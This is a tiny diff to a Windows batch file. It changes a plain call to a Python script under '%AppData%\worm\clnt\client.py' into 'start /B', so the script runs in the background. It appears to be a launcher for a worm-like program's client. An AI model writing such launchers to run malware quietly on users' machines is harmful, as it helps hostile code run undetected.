@@ -1,2 +1,2 @@
 @echo off
-python "%AppData%\worm\clnt\client.py"
+start /B python "%AppData%\worm\clnt\client.py"
